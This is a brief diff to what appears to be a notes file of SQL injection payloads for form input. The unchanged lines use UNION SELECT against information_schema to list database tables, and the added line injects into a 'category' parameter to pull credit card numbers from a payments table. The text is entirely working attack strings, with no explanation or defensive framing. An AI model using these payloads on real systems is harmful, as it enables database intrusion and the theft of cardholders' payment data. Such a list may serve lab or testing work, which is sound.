@@ -11,3 +11,6 @@ POST Method (Form Input):
 
 Audi' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables #
 Audi' UNION SELECT 1,2,3,table_schema,table_name FROM information_schema.tables; #
+
+
+category=1 UNION SELECT 1,creditcard_number,3 FROM payments
